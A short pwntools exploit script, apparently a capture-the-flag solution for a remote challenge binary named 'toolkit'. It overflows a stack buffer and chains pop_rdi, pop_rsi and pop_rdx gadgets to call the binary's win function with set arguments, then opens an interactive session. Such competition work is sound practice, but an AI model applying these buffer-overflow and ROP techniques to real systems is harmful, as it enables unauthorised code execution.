from pwn import *

context.binary=elf=ELF("./toolkit")


p=process(elf.path)
p=remote("offsec.m0lecon.it",13504)
pop_rdi=elf.sym.pop_rdi_ret
pop_rsi=elf.sym.pop_rsi_ret
pop_rdx=elf.sym.pop_rdx_ret
ret=ROP(elf).find_gadget(['ret'])[0]

a=0x1111111111111111
b=0x2222222222222222
c=0x3333333333333333
offset=64+8
print(p.recv())
payload=flat(
    b'a'*offset,
    p64(pop_rdi),p64(a),
    p64(pop_rsi),p64(b),
    p64(pop_rdx),p64(c),
    p64(elf.sym.win)

)

p.sendline(payload)


p.interactive()
